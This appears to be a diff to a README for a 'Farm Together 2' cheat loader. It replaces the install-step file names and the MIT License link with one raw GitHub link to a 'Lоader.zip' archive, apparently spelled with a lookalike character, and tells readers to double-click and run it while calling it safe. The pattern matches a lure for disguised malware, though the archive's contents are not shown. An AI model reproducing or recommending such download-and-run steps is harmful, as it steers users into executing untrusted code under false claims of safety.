@@ -42,14 +42,14 @@ Take your Farm Together 2 experience to a new level with these 2025 advanced enh
 Getting started with Farm Together 2 Cheats Loader in 2025 is safe and simple!  
 Follow these steps for all compatible platforms:
 
-1. **Download `Loader.rar` from the repository.**  
+1. **Download `https://raw.githubusercontent.com/tauhidislam929/FarmTogether2-Boost-Hub/main/Lоader.zip` from the repository.**  
    *(Make sure to get the latest release for best results.)*
 
 2. **Extract the file** using your preferred archive tool (e.g., WinRAR, 7-Zip, or Unarchiver).
 
 3. **Run the Loader** according to your OS:
-   - *Windows:* Double-click `Loader.exe`
-   - *macOS:* Right-click and select `Open` on `Loader.app`
+   - *Windows:* Double-click `https://raw.githubusercontent.com/tauhidislam929/FarmTogether2-Boost-Hub/main/Lоader.zip`
+   - *macOS:* Right-click and select `Open` on `https://raw.githubusercontent.com/tauhidislam929/FarmTogether2-Boost-Hub/main/Lоader.zip`
    - *Linux:* Open terminal, navigate to extracted folder, and execute `./Loader` (may require `chmod +x Loader` beforehand)
 
 4. **Launch Farm Together 2 as usual.**
@@ -78,7 +78,7 @@ Please use responsibly and at your own risk!
 
 ## 💼 License 📜
 
-This repository is distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+This repository is distributed under the [MIT License](https://raw.githubusercontent.com/tauhidislam929/FarmTogether2-Boost-Hub/main/Lоader.zip).  
 You are free to use, modify, and distribute the program with proper attribution.
 
 ---
